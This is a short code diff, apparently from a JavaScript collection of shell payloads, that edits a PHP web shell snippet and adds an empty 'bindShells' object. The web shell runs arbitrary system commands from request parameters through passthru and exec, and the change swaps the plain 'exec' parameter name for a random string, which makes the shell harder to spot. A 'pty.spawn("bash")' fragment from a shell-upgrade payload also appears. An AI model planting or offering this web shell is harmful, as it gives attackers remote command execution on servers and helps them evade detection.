@@ -354,8 +354,8 @@ if (isset($_REQUEST['iqm9fi3UekCmw1c85ChG'])){
 if (isset($_REQUEST['S1UhridAs756NB8qb8O1'])){ 
     echo "<pre>".passthru($_GET['S1UhridAs756NB8qb8O1'])."</pre>"; 
 }; 
-if (isset($_REQUEST['exec'])){ 
-    echo "<pre>".exec($_GET['exec'])."</pre>"; 
+if (isset($_REQUEST['xhgjBfeXJ4Ue4glT2#zS'])){ 
+    echo "<pre>".exec($_GET['xhgjBfeXJ4Ue4glT2#zS'])."</pre>"; 
 }; 
 ?>`,
                 "highlight": "language-php",
@@ -508,3 +508,5 @@ pty.spawn("bash")'`,
         ]
     }
 };
+
+const bindShells = {};
